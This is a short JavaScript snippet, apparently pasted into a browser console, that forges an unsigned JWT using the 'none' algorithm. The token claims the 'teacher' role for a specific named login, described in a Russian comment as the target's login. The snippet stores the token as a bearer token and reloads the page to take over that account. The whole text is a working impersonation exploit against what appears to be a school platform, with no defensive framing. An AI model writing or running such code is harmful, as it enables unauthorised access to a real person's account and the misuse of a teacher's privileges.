let teacher = "bujanovagv"; // логин цели

let h = { alg: "none", typ: "JWT" };
let p = { role: "teacher", login: teacher, iat: Date.now()/1000 };
let token = btoa(JSON.stringify(h)).replace(/=/g,'') + "." + 
            btoa(JSON.stringify(p)).replace(/=/g,'') + ".";

localStorage.setItem("token_bearer", token);
location.reload();